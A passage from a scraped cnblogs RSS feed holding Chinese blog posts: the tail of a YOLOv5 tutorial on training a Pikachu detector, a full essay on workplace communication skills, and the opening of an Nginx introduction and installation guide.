&lt;p&gt;&lt;a href=&quot;https://github.com/ultralytics/yolov5/wiki/Train-Custom-Data&quot; target=&quot;_blank&quot;&gt;https://github.com/ultralytics/yolov5/wiki/Train-Custom-Data&lt;/a&gt;&lt;br/&gt;根据官方指导，按需要的格式准备数据集：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;一个图片文件对应一个同名的.txt label文件&lt;/li&gt;
&lt;li&gt;label文件中每一行表示一个目标，格式为：class x_center y_center box_width box_height, 其中数值都是归一化的。类别从0开始&lt;/li&gt;
&lt;li&gt;按类似目录方式防止数据，yolov5通过将图片路径中最后一个images换成labels去寻找对应的标签&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code&gt;coco/images/000000109622.jpg  # image
coco/labels/000000109622.txt  # label
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;本文中用的数据来源于 &lt;a href=&quot;http://zh.d2l.ai/chapter_computer-vision/object-detection-dataset.html&quot; target=&quot;_blank&quot;&gt;目标检测数据集（皮卡丘）&lt;/a&gt; 中，但原文是mxnet用的rec格式，因此需要转换成yolo格式。我已经转好了：&lt;br/&gt;链接: &lt;a href=&quot;https://pan.baidu.com/s/16OSwaYjgJK3UqARt8oDBtA&quot; target=&quot;_blank&quot;&gt;百度网盘数据集&lt;/a&gt; 提取码: rek1&lt;br/&gt;下载后解压即可得到符合格式要求的数据。&lt;br/&gt;数据示例：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://storage.live.com/items/F749ABC6249A7092!4585?authkey=APQrfGBrZ55_xwU&quot; alt=&quot;image&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;训练前的配置&quot;&gt;训练前的配置&lt;/h2&gt;
&lt;h3 id=&quot;修改或新建datasetyaml&quot;&gt;修改或新建dataset.yaml&lt;/h3&gt;
&lt;p&gt;在data目录下，我们可以看到一个coco.yaml，内容如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;# COCO 2017 dataset http://cocodataset.org - first 128 training images
# Train command: python train.py --data coco128.yaml
# Default dataset location is next to /yolov5:
#   /parent_folder
#     /coco128
#     /yolov5


# download command/URL (optional)
# download: https://github.com/ultralytics/yolov5/releases/download/v1.0/coco128.zip

# train and val data as 1) directory: path/images/, 2) file: path/images.txt, or 3) list: [path1/images/, path2/images/]
train: ./data/coco128/images/train2017/  # 训练集图片路径
val: ./data/coco128/images/train2017/  # 验证集图片路径

# number of classes，类别数
nc: 80

# class names，类别名
names: ['person', 'bicycle', 'car', 'motorcycle', 'airplane', 'bus', 'train', 'truck', 'boat', 'traffic light',
        'fire hydrant', 'stop sign', 'parking meter', 'bench', 'bird', 'cat', 'dog', 'horse', 'sheep', 'cow',
        'elephant', 'bear', 'zebra', 'giraffe', 'backpack', 'umbrella', 'handbag', 'tie', 'suitcase', 'frisbee',
        'skis', 'snowboard', 'sports ball', 'kite', 'baseball bat', 'baseball glove', 'skateboard', 'surfboard',
        'tennis racket', 'bottle', 'wine glass', 'cup', 'fork', 'knife', 'spoon', 'bowl', 'banana', 'apple',
        'sandwich', 'orange', 'broccoli', 'carrot', 'hot dog', 'pizza', 'donut', 'cake', 'chair', 'couch',
        'potted plant', 'bed', 'dining table', 'toilet', 'tv', 'laptop', 'mouse', 'remote', 'keyboard', 'cell phone',
        'microwave', 'oven', 'toaster', 'sink', 'refrigerator', 'book', 'clock', 'vase', 'scissors', 'teddy bear',
        'hair drier', 'toothbrush']
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;仿照这个格式，建立皮卡丘数据集的配置文件：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;# COCO 2017 dataset http://cocodataset.org - first 128 training images
# Train command: python train.py --data coco128.yaml
# Default dataset location is next to /yolov5:
#   /parent_folder
#     /coco128
#     /yolov5


# download command/URL (optional)
# download: https://github.com/ultralytics/yolov5/releases/download/v1.0/coco128.zip

# train and val data as 1) directory: path/images/, 2) file: path/images.txt, or 3) list: [path1/images/, path2/images/]
train: ./data/pikachu/images/train/  # 128 images
val: ./data/pikachu/images/val/  # 128 images

# number of classes
nc: 1

# class names
names: ['pikachu']

&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;训练参数配置&quot;&gt;训练参数配置&lt;/h3&gt;
&lt;p&gt;训练参数配置在data/hyp.finetune.yaml和hyp.scratch.yaml中，前者是finetune用的，后者是从头训练的。这次我们直接用hyp.finetune.yaml，先不做修改。&lt;/p&gt;
&lt;h3 id=&quot;模型配置&quot;&gt;模型配置&lt;/h3&gt;
&lt;p&gt;模型配置在models/yolov5s.yaml中。目前也不做修改。&lt;/p&gt;
&lt;h2 id=&quot;开始训练&quot;&gt;开始训练&lt;/h2&gt;
&lt;p&gt;训练使用train.py脚本，主要参数有：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;--weights 预训练权重，“”表示从头训  
--cfg 模型配置文件路径  
--data 数据配置文件路径  
--hyp 训练参数配置文件路径  
--epochs 训练的epoch数 
--batch-size 
--img-size 网络的输入大小  
--noautoanchor 是否自动计算anchor  
--device 设备号  
--workers dataloader线程数
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;还有很多其他参数，不过暂时用不上就先不管了,执行以下命令可开始训练，脚本会自动去下载yolov5s的预训练权重进行训练。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;python train.py --weights yolov5.pt --data data/pikachu.yaml --hyp data/hyp.finetune.yaml --epochs 40 --img-size 320 --device 0 --batch-size 512 
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;可视化&quot;&gt;可视化&lt;/h2&gt;
&lt;p&gt;yolov5里面有两种可视化方式，一种是tensorboard, 一种是wandb。&lt;br/&gt;其中wandb有两种使用方式，一种是到https://wandb.ai/home注册一个账号，在线使用。注册后新建项目,名字叫yolov5，然后本地安装配置wandb, 按提示输入必要的信息（API Key):&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;pip install wandb  
wandb login
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;那么训练时就可以在自己的项目中看到如下画面，还是挺不错的，功能挺丰富：&lt;br/&gt;&lt;img src=&quot;https://storage.live.com/items/F749ABC6249A7092!4584?authkey=APQrfGBrZ55_xwU&quot; alt=&quot;image&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;不过这个网站挺卡的，好在wandb也有本地使用方式。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;安装docker后
wandb local
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.wandb.ai/self-hosted/local&quot; target=&quot;_blank&quot;&gt;https://docs.wandb.ai/self-hosted/local&lt;/a&gt;&lt;br/&gt;然后就可以本地访问了。&lt;/p&gt;
&lt;h2 id=&quot;测试&quot;&gt;测试&lt;/h2&gt;
&lt;p&gt;有两个脚本和测试有关，test.py是用来跑测试集测性能的，detect.py是用来测试文件夹或摄像头的。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;python detect.py --source data/images --weights yolov5s.pt --conf-thres 0.25 
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在run/detect下即可找到图像画有目标框的图像（也可以在执行detect.py的时候指定--view-img选项，即可显示图像）：&lt;br/&gt;&lt;img src=&quot;https://storage.live.com/items/F749ABC6249A7092!4586?authkey=APQrfGBrZ55_xwU&quot; alt=&quot;image&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;结语&quot;&gt;结语&lt;/h2&gt;
&lt;p&gt;至此就训练出了一个简单的检测模型呢，虽然很简单，不过基本流程通了。在走通流程后就要继续了解实现的细节，如何调参等等了。可以从了解网络结构开始，可参考 [&lt;a href=&quot;https://zhuanlan.zhihu.com/p/343195876&quot; target=&quot;_blank&quot;&gt;https://zhuanlan.zhihu.com/p/343195876&lt;/a&gt;](&lt;a href=&quot;https://zhuanlan.zhihu.com/p/343195876&quot; target=&quot;_blank&quot;&gt;https://zhuanlan.zhihu.com/p/343195876&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注：如果数据集链接过期了，关注 老司机的视觉屋，回复pikachu即可获取链接&lt;/strong&gt;&lt;/p&gt;
</description>
<pubDate>Wed, 13 Jan 2021 17:11:00 +0000</pubDate>
<dc:creator>haoliuhust</dc:creator>
<og:description>前言 从接触深度学习开始一直都做的是人脸识别，基本上也一直都在用mxnet. 记得之前在刚接触的时候看到博客中写到，深度学习分三个层次，第一个层次是分类，第二个层次是检测，第三个层次是分割。人脸识别算</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/haoliuhust/p/14275240.html</dc:identifier>
</item>
<item>
<title>浅谈沟通技巧 - bee0060</title>
<link>http://www.cnblogs.com/bee0060/p/14129513.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/bee0060/p/14129513.html</guid>
<description>&lt;p&gt;原创文章， 转载请注明出处&lt;a href=&quot;https://www.cnblogs.com/bee0060/p/14129513.html&quot; target=&quot;_blank&quot;&gt;https://www.cnblogs.com/bee0060/p/14129513.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;作者： bee0060&lt;/p&gt;
&lt;hr/&gt;&lt;h2 id=&quot;巴别塔&quot;&gt;巴别塔&lt;/h2&gt;
&lt;p&gt;巴别塔的英文名叫&lt;strong&gt;Babel&lt;/strong&gt;，相信前端同学们对babel都很熟悉了，但是巴别塔的故事不知道大家有没听过？故事大概剧情如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;巴别塔 （希伯来语：מִגְדַּל בָּבֶל‬‬‎，Migdal Bāḇēl）；也译作巴贝尔塔、巴比伦塔，或意译为通天塔），本是犹太教《塔纳赫·创世纪篇》（该书又被称作《希伯来圣经》或者《旧约全书》）中的一个故事，说的是人类产生不同语言的起源。

当时地上的人们都说同一种语言，当人们离开东方之后，他们来到了示拿之地。在那里，人类联合起来兴建希望能通往天堂的高塔。上帝来到人间后看到了这座城和这座塔，说一群只说一种语言的人以后便没有他们做不成的事了；于是上帝将他们的语言打乱，这样他们就不能听懂对方说什么了，还把他们分散到了世界各地，巴别塔的建造就此搁置，这座城市也停止了修建。这座城市就被称为“巴别城”
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;除了巴别塔的故事，在团队建设和管理领域，也有一个著名的问题，叫做巴别塔难题（Babel problem）， 大概意思是：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;任何组织及其合作伙伴都倾向于成为各自为营、敌我相向的派系或团体。
各派系之间操着不同的语言，守着不同的利益，也追求着不同的目标。
结果导致总体小于局部之和。
巴别塔难题广泛存在于各类组织之中，不论其规模大小或正式与否。
它无孔不入，乃至当它在你眼前发生时，也不一定能够引起你足够的重视。
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;为什么说这些呢？ 沟通，是日常工作中发生得最多的事情，而由于人与人之间思维习惯等各种差异，沟通很容易导致误解和冲突，当冲突积累到一定程度而得不到解决，那么这个团队很可能会出现巴别塔难题，以致走向分裂。&lt;/p&gt;
&lt;h2 id=&quot;什么是沟通&quot;&gt;什么是沟通&lt;/h2&gt;
&lt;p&gt;我觉得沟通，最简单和最关键的因素有两点：&lt;/p&gt;
&lt;h3 id=&quot;1-沟通至少有两人参与&quot;&gt;1. 沟通至少有两人参与&lt;/h3&gt;
&lt;p&gt;这句貌似是一句废话？ 是也不是，这句话是为了提醒大家时刻记住一个很容易被忘记的事实：&lt;/p&gt;
&lt;p&gt;&lt;em&gt;你的沟通对象和你不同，你们的思维习惯、知识、经验、常识、使用的术语都可能不同，你说的话对方理解到的未必是你想表达的意思，误解时时刻刻都会发生。沟通双方都需要付出努力来明白对方说的话以及让对方明白自己说的话。&lt;/em&gt;&lt;/p&gt;
&lt;h3 id=&quot;2-一般有目的性&quot;&gt;2. 一般有目的性&lt;/h3&gt;
&lt;p&gt;工作中沟通的目的大多是以下三种之一：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;传达信息&lt;/li&gt;
&lt;li&gt;获取信息&lt;/li&gt;
&lt;li&gt;共同解决问题&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;跑题是常见的沟通问题之一，所以明确且记住沟通的目的很重要。&lt;/p&gt;
&lt;p&gt;（当然，日常沟通还有寒暄、打招呼等，你可能认为这些沟通没有目的，其实不然，这些沟通的目的就是打个招呼、避免尴尬、或为了之后的聊天做铺垫，一般这种日常沟通的目的也比较容易达成。）&lt;/p&gt;
&lt;h2 id=&quot;常见的沟通问题&quot;&gt;常见的沟通问题&lt;/h2&gt;
&lt;ol&gt;&lt;li&gt;低效甚至无效的沟通&lt;/li&gt;
&lt;li&gt;引起冲突&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;低效无效沟通&quot;&gt;低效/无效沟通&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;因过多争论、打断等原因无法顺利进行或不欢而散&lt;/li&gt;
&lt;li&gt;沟通没有明确的结论，草草结束&lt;/li&gt;
&lt;li&gt;参与者对结论理解不同，导致后续的行动不一致，甚至需要多一场沟通来澄清&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;引起冲突&quot;&gt;引起冲突&lt;/h3&gt;
&lt;p&gt;沟通中很容易引起冲突，引起的原因有很多，由于互相不理解、各执己见、互相频繁打断，或有人经常贬低或否定别人等等&lt;/p&gt;
&lt;h3 id=&quot;问题导致的后果&quot;&gt;问题导致的后果&lt;/h3&gt;
&lt;p&gt;以上这些问题可能导致的后果：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;浪费时间&lt;/li&gt;
&lt;li&gt;降低团队成员沟通的欲望甚至逃避沟通，在不得不沟通时才沟通，耽误事&lt;/li&gt;
&lt;li&gt;导致巴别塔难题， 团队走向分裂&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;说完问题和可能的后果，下面该说说建议了。&lt;/p&gt;
&lt;h2 id=&quot;针对上述问题的一些建议&quot;&gt;针对上述问题的一些建议&lt;/h2&gt;
&lt;p&gt;这里的建议主要针对以下几点:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;减少打断&lt;/li&gt;
&lt;li&gt;提高沟通的效率和有效性&lt;/li&gt;
&lt;li&gt;如何说服别人&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;通用建议&quot;&gt;通用建议&lt;/h3&gt;
&lt;p&gt;在说具体建议之前，我想先举一个不太恰当的例子： &lt;strong&gt;牛顿第三定律&lt;/strong&gt;：&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;作用力等于反作用力&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这里我想先问问大家以下几个问题：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;如果有个人总是打断你说话，你还会有耐心听他把话说完吗？&lt;/li&gt;
&lt;li&gt;如果有个人总是喜欢贬低、否定你，他在你心目中的形象会变得更高大吗？&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;我相信答案都是否定的。 那么如果我们说话总打断别人，也就别指望别人能好好听我们说话了。所以我想先说的两点概括性建议是：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;从我做起&lt;/li&gt;
&lt;li&gt;己所不欲勿施于人&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;也就是我们不希望对方怎么样，我们自己先别这样。打断、贬低、否定皆如此。&lt;/p&gt;
&lt;p&gt;好了，做好了铺垫，下面是具体问题的建议。&lt;/p&gt;
&lt;h3 id=&quot;如何减少打断&quot;&gt;如何减少打断&lt;/h3&gt;
&lt;p&gt;在讨论如何解决前，我想先聊聊打断带来的问题：&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;频繁的互相打断，会让双方都无法完整表达想法，那么双方的沟通将建立在不完整的信息上，很容易导致双方基于错误的基础展开讨论，那么整个沟通的效率会非常低，甚至完全没有意义。即使大方向没有错误，一个人被打断后，也依然会想方设法继续表达自己的观点，这会增加双方表达的成本，因此让沟通非常低效。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;想解决一个问题，我一般先分析问题的原因。所以我想到的第一个问题是，为什么会发生打断，我们打断别人的目的是什么？ 然后我想到：&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;争取发言机会，想让别人听自己说并了解自己的想法。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;说来惭愧，我也经常忍不住打断别人，上面这个可能是我打断别人的主要原因，工作中我也看到有些同事是这样。那么怎么解决呢？下面是我的建议：&lt;/p&gt;
&lt;h4 id=&quot;解决&quot;&gt;&lt;strong&gt;解决&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;首先，如果沟通已经陷入互相打断的局面，一般是很难扭转的。所以我的建议不是在出现频繁打断后才解决，而是将解决提前或推后，即在沟通外协商：&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;在沟通前或某次有问题的沟通之后协商，先阐述打断带来的问题（如上面提到的），以及下次沟通时双方应遵守的规则：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;协商双方都尽量不要打断对方&lt;/li&gt;
&lt;li&gt;让每个人都有足够且适时的发言机会&lt;/li&gt;
&lt;li&gt;承诺自己会先做到（并在之后的沟通中确实做到，即使对方没有做到）&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
&lt;p&gt;因为打断的初衷大多是表达，如果我们原本就给了足够的表达机会，那么大部分打断一般可以避免。相反，如果一场沟通中，一个人滔滔不绝的讲半天而不给别人发言机会，这个人也很难不被打断。&lt;/p&gt;
&lt;h3 id=&quot;提高沟通的效率和有效性&quot;&gt;提高沟通的效率和有效性&lt;/h3&gt;
&lt;p&gt;导致低效甚至无效的沟通可能是因为误解、跑题、没有结论或结论理解不一致等原因，基于这些原因，我的建议如下：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;提前确认目标&lt;/li&gt;
&lt;li&gt;有必要的话，统一术语（不同职能的人沟通时一般很有用）&lt;/li&gt;
&lt;li&gt;沟通过程中时刻注意是否跑题，若跑题，尽快纠正&lt;/li&gt;
&lt;li&gt;达成沟通目标后尽快结束该场沟通&lt;/li&gt;
&lt;li&gt;在沟通结束之前或之后确认结论，确保参与沟通的人理解一致，有必要的话留下文字记录。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;以上是沟通能进行下去的情况。 有时我们也会遇到沟通陷入僵局，双方争持不下无法进展的情况，遇到这种情况，我的建议是:&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;尽快结束这场沟通，另择良辰吉日再行沟通。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;如果沟通双方并不总是无法沟通的人，那么有可能因为沟通中或当天情绪问题，导致沟通无法进行，那么不妨先尽快结束。待双方都冷静下来，有适合的状态时再重新沟通。而且在两次沟通之间，大家也有时间思考一下沟通的主题，也有利于促进下次沟通的进展。&lt;/p&gt;
&lt;h3 id=&quot;说服别人&quot;&gt;说服别人&lt;/h3&gt;
&lt;p&gt;不知道大家是否同意：想说服别人接受我们的想法，是一件很难的事情。&lt;/p&gt;
&lt;p&gt;所以这里只是些我觉得可以提高说服成功率的建议，并不能保证一定成功。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;这里讨论的前提是，沟通双方没有很大的职位、权力、专业能力上的差距，可以进行比较平等的沟通。即不能依靠沟通外的力量强行压服对方。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;我的建议如下:&lt;/p&gt;
&lt;h4 id=&quot;1-让自己能被说服：&quot;&gt;&lt;strong&gt;1. 让自己能被说服：&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;这代表我们至少要做到两点：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;讲道理&lt;/li&gt;
&lt;li&gt;对事不对人&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;如果我们自己做不到这两点，那么基于作用力等于反作用力，对方可能也一样不可被说服。所以这是最优先的一点建议。&lt;/p&gt;
&lt;h4 id=&quot;2-站在对方的角度思考：&quot;&gt;&lt;strong&gt;2. 站在对方的角度思考：&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;一般低效的沟通容易陷入沟通双方自说自话，导致不理解和矛盾不断加深，所以我建议尝试站在对方角度思考问题。正所谓知己知彼百战不殆，如果能站在对方角度思考，也更容易找出对方能信服的理由、解决对方真正关心的问题或找出对方逻辑上的问题。且如果我们还能尽量采用对方容易接受的描述方式，例如使用对方的熟悉的术语，这样也能起到事半功倍的效果。&lt;/p&gt;
&lt;h4 id=&quot;3-不强求胜利，求同存异&quot;&gt;&lt;strong&gt;3. 不强求胜利，求同存异:&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;其实大部分工作中的沟通，即使事后发现结论错误，大多不会导致不可挽回的后果，更重要的是快速得出结论并行动起来，有问题快速纠正。而争执不断原地踏步可能是更大的问题。&lt;/p&gt;
&lt;h2 id=&quot;沟通技能中最重要的技巧&quot;&gt;沟通技能中最重要的技巧&lt;/h2&gt;
&lt;p&gt;不是别的， 是&lt;strong&gt;听&lt;/strong&gt;！&lt;/p&gt;
&lt;p&gt;这可不光是我说的，很多擅长沟通的人，或讲沟通的文章也是这么说的。至于具体为什么，限于篇幅，请恕在下这里就不展开了，有兴趣或质疑的同学欢迎尝试自己搜一下。&lt;/p&gt;
&lt;p&gt;为什么说听重要？&lt;br/&gt;因为你好好听别人说的时候，往往能附带以下作用：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;表达对对方的尊重&lt;/li&gt;
&lt;li&gt;帮助我们了解对方的真实想法以促进沟通效率&lt;/li&gt;
&lt;li&gt;增加对方也好好听我们说的概率&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;所以建议大家重视并培养一下倾听的技巧。至于细节本文就不展开了，有机会的话可能另起一篇单独说说。&lt;/p&gt;
&lt;h2 id=&quot;最后的建议&quot;&gt;最后的建议&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;沟通不一定是对抗，也可以是一场协作&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;其实工作中大部分沟通是用于共同找出解决方案的，只是如果沟通时不止一个人有想法，且都希望自己的想法被执行，这很容易让沟通陷入一种对抗状态。&lt;br/&gt;但其实，前面说过，沟通一般是有目的的， 不要忘记最初的目的，即“&lt;strong&gt;为某一问题找出解决方案&lt;/strong&gt;”， 而不是“&lt;strong&gt;让大家接受我的方案&lt;/strong&gt;”。 所以我们不妨转变思路，将对抗变成协作。&lt;/p&gt;
&lt;p&gt;如果是对抗的话，那么沟通的效率和有效性可能会依据木桶定理，由参与沟通的多方的最短板来决定。请设想一下，参与沟通又有想法的人中，有人表达能力很差或倾听能力很差，那么沟通将会磕磕绊绊。&lt;/p&gt;
&lt;p&gt;但如果是协作的关系的话，参与沟通的人的能力将可以适当互补，例如你说的不清楚，我可以稍微引导或辅助一下，让你说的更清楚一点；我听不懂，你可以多解释一下让我更明白一点。意识不同决定行动不同。不必把沟通都当成一场PK或辩论。&lt;/p&gt;
&lt;h2 id=&quot;最后&quot;&gt;最后&lt;/h2&gt;
&lt;p&gt;限于经验和能力，说的不对的地方欢迎指出，也欢迎分享你遇到过的沟通问题一起讨论。&lt;/p&gt;
&lt;p&gt;最后祝大家工作中沟通顺利，不要打起来。&lt;/p&gt;
&lt;p&gt;谢谢观看。&lt;/p&gt;
</description>
<pubDate>Wed, 13 Jan 2021 17:05:00 +0000</pubDate>
<dc:creator>bee0060</dc:creator>
<og:description>原创文章， 转载请注明出处https://www.cnblogs.com/bee0060/p/14129513.html 作者： bee0060 巴别塔 巴别塔的英文名叫Babel，相信前端同学们对b</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/bee0060/p/14129513.html</dc:identifier>
</item>
<item>
<title>Nginx详解 - MPolaris</title>
<link>http://www.cnblogs.com/mpolaris/p/14275163.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/mpolaris/p/14275163.html</guid>
<description>&lt;h4 id=&quot;1-nginx简介&quot;&gt;1. Nginx简介&lt;/h4&gt;
&lt;h5 id=&quot;11-nginx-的应用场景&quot;&gt;1.1 Nginx 的应用场景&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;Nginx (&quot;engine x&quot;)&lt;/code&gt; 是一个 &lt;span&gt;高性能的 HTTP 和反向代理服务器&lt;/span&gt;，特点是占有内存少，并发能力强。事实上 Nginx 的并发能力确实在同类型的网页服务器中表现较好，中国大陆使用 Nginx 的网站用户有：百度、京东、新浪、网易、腾讯、淘宝等。&lt;/p&gt;
&lt;p&gt;Nginx 可以作为静态页面的 web 服务器，同时还支持 CGI 协议的动态语言比如 perl、php等，但是不支持 java，Java 程序只能通过与 tomcat 配合完成。Nginx 专为性能优化而开发，性能是其最重要的考量，实现上非常注重效率 ，能经受高负载的考验，有报告表明能支持高达 50,000 个并发连接数。&lt;/p&gt;
&lt;p&gt;Nginx 是 C语言开发，建议在 Linux 上运行，当然也可以安装 Windows 版本。&lt;/p&gt;
&lt;h5 id=&quot;12-反向代理与反向代理&quot;&gt;1.2 反向代理与反向代理&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;正向代理&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Nginx 不仅可以做反向代理实现负载均衡，还能用作为正向代理来进行上网等功能。正向代理：如果把局域网外的 Internet 想象成一个巨大的资源库，则局域网中的客户端要访问 Internet则需要通过代理服务器来访问，这种代理服务就称为正向代理。&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/Nginx/20210113225454.png&quot; alt=&quot;image-20210101223821389&quot;/&gt;&lt;p&gt;&lt;strong&gt;反向代理&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;其实客户端对代理是无感知的，因为客户端不需要任何配置就可以访问网页，我们只需要将请求发送到反向代理服务器，由反向代理服务器去选择目标服务器获取数据后再返回给客户端，此时反向代理服务器和目标服务器对外就是一个服务器，暴露的是代理服务器地址，隐藏了真实服务器 IP 地址。&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/Nginx/20210113225455.png&quot; alt=&quot;image-20210101223821389&quot;/&gt;&lt;h5 id=&quot;13-负载均衡&quot;&gt;1.3 负载均衡&lt;/h5&gt;
&lt;p&gt;客户端发送多个请求到服务器，服务器处理请求，有一些可能要与数据库进行交互，服务器处理完毕后再将结果返回给客户端。 这种架构模式对于早期的系统相对单一，并发请求相对较少的情况下是比较适合的成本也低。但是随着信息数量的不断增长，访问量和数据量的飞速增长，以及系统业务的复杂度增加，这种架构会造成服务器相应客户端的请求日益缓慢，并发量特别大的时候还容易造成服务器直接崩溃。很明显这是由于服务器性能的瓶颈造成的问题，那么如何解决这种情况呢？&lt;/p&gt;
&lt;p&gt;我们首先想到的可能是升级服务器的配置，比如提高 CPU 执行频率，加大内存等提高机器的物理性能来解决此问题，但是我们知道摩尔定律的日益失效，硬件的性能提升已经不能满足日益提升的需求了。最明显的一个例子，天猫双十一当天某个热销商品的瞬时访问量是极其庞大的，那么类似上面的系统架构，将机器都增加到现有的顶级物理配置，都是不能够满足需求的。那么怎么办呢？&lt;/p&gt;
&lt;p&gt;上面的分析我们去掉了增加服务器物理配置来解决问题的办法也就是说纵向解决问题的办法行不通了，那么横向增加服务器的数量呢？这时候集群的概念产生了，单个服务器解决不了我们增加服务器的数量，然后将请求分发到各个服务器上，将原先请求集中到单个服务器上的情况改为将请求分发到多个服务器上，将负载分发到不同的服务器，也就是我们所说的&lt;strong&gt;负载均衡&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/Nginx/20210113225456.png&quot; alt=&quot;image-20210101223821389&quot;/&gt;&lt;h5 id=&quot;14-动静分离&quot;&gt;1.4 动静分离&lt;/h5&gt;
&lt;p&gt;为了加快网站的解析速度，可以把动态页面和静态页面由不同的服务器来解析加快解析速度。降低原来单个服务器的压力。&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/Nginx/20210113225457.png&quot; alt=&quot;image-20210101223821389&quot;/&gt;&lt;h4 id=&quot;2-安装&quot;&gt;2. 安装&lt;/h4&gt;
&lt;h5 id=&quot;21-在linux中安装nginx&quot;&gt;2.1 在Linux中安装Nginx&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;GCC安装（如果没有的话）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;安装 nginx 需要先将官网下载的源码进行编译，编译依赖 gcc 环境，如果没有 gcc 环境则需要安装&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;yum install gcc-c++
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;pcre安装&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;PCRE(Perl Compatible Regular Expressions) 是一个Perl库，包括 perl 兼容的正则表达式库。nginx 的 http 模块使用 pcre 来解析正则表达式，所以需要在 linux 上安装 pcre 库，pcre-devel 是使用 pcre 开发的一个二次开发库。nginx也需要此库。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;yum install -y pcre pcre-devel
# 查看安装版本
pcre-config --version
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;openssl安装&lt;/strong&gt;&lt;/p&gt;
